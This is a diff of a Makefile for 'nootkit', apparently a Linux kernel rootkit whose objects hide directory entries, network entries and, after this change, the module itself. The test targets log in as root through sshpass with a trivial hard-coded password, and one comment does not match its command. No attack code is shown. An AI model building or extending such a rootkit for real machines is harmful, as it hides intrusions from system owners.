@@ -1,9 +1,9 @@
 KDIR := ${PWD}/kernel-headers/linux-headers-5.15.0-76-generic
 obj-m := nootkit.o
 nootkit-y := src/nootkit_main.o src/ksyms.o src/config.o
-nootkit-y += src/hide/readdir.o src/hide/proc_net.o src/hide/net_rx.o
+nootkit-y += src/hide/readdir.o src/hide/proc_net.o src/hide/net_rx.o src/hide/module.o
 nootkit-y += src/arch/x86_64/hook.o src/arch/x86_64/mm.o
-nootkit-y += src/arch/x86_64/hide/readdir_sys.o
+nootkit-y += src/arch/x86_64/hide/readdir_sys.o src/arch/x86_64/hide/module_sys.o
 
 ccflags-y := -I$(src)/src
 
@@ -19,6 +19,8 @@ clean:
 
 test-remove:
 	-sshpass -pa ssh root@${TEST_IP} "rmmod nootkit"
+	-sshpass -pa ssh root@${TEST_IP} "rm /nootkit.ko"
+	# rmmod a second time
 	-sshpass -pa ssh root@${TEST_IP} "rm /nootkit.ko"
 
 test-upload: build
